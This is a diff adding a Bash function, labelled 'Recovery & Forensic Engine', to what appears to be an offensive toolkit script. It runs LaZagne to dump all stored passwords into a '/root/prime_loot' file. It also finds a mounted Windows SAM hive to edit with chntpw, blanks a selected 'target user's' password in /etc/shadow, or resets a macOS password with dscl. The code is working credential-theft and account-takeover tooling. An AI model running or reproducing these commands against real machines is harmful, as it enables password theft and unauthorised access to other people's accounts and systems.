@@ -429,3 +429,78 @@ run_smart_osint_engine() {
     pause
 }
 
+
+run_pc_recovery_ultimate() {
+    print_header "RECOVERY & FORENSIC ENGINE"
+
+    # 1. Основное меню
+    local action=$(select_option "Select Forensic Action:" \
+        "Passwords Extraction (LaZagne):extraction" \
+        "Smart Password Reset (Win/Lin/Mac):reset" \
+        "Exit to Main Menu:exit")
+
+    case "$action" in
+        "extraction")
+            local lz_path="/root/lazagne/lazagne.py"
+            check_step "file" "$lz_path" "LaZagne not found." && {
+                print_status "i" "Running Extraction..."
+                python3 "$lz_path" all -oN /root/prime_loot/passwords.txt
+                log_loot "forensic" "Dumped to /root/prime_loot/passwords.txt"
+                print_status "s" "Extraction Complete."
+            }
+            ;;
+
+        "reset")
+            print_status "i" "Detecting Target Environment..."
+            
+            # Поиск Windows SAM
+            local win_sam=$(find /mnt /media /run/media -type f -name "SAM" -path "*/System32/config/*" 2>/dev/null | head -n 1)
+            
+            # ВМЕСТО IF: Используем логическое И (&&) для Windows
+            [[ -n "$win_sam" ]] && {
+                print_status "s" "Windows SAM detected: $win_sam"
+                check_step "cmd" "chntpw" "CHNTPW not installed." && chntpw -i "$win_sam"
+            }
+            
+            # И логическое И-НЕ (&& !) для проверки других ОС, если SAM не найден
+            [[ -z "$win_sam" ]] && {
+                local os_type="Unknown"
+                [[ "$OSTYPE" == "linux-gnu"* ]] && os_type="Linux"
+                [[ "$OSTYPE" == "darwin"* ]] && os_type="macOS"
+                
+                print_status "i" "OS: $os_type"
+
+                # Сбор пользователей (выбираем команду в зависимости от ОС)
+                local cmd_get_users="awk -F: '\$3 >= 1000 && \$1 != \"nobody\" {print \$1}' /etc/passwd"
+                [[ "$os_type" == "macOS" ]] && cmd_get_users="dscl . list /Users | grep -v '^_\|root'"
+                
+                local users=$(eval "$cmd_get_users")
+                
+                # Если пользователи есть — идем дальше, если нет — выводим ошибку через ||
+                [[ -n "$users" ]] || { print_status "e" "No local users found."; pause; return; }
+
+                # Динамическая сборка списка для select_option
+                local user_options=()
+                for u in $users; do user_options+=("$u:$u"); done
+                
+                local target_user=$(select_option "Select Target User:" "${user_options[@]}")
+
+                # Сброс пароля (снова без IF — через селектор ОС)
+                [[ "$os_type" == "Linux" ]] && ask_confirm "Clear password for $target_user?" && {
+                    sed -i "s/^$target_user:[^:]*:/$target_user::/" /etc/shadow
+                    print_status "s" "Linux password wiped."
+                }
+
+                [[ "$os_type" == "macOS" ]] && {
+                    echo -en "${Y}New Pass: ${NC}"; read -r np
+                    sudo dscl . -passwd /Users/"$target_user" "$np"
+                    print_status "s" "macOS password updated."
+                }
+            }
+            ;;
+        *) return ;;
+    esac
+
+    pause
+}
+
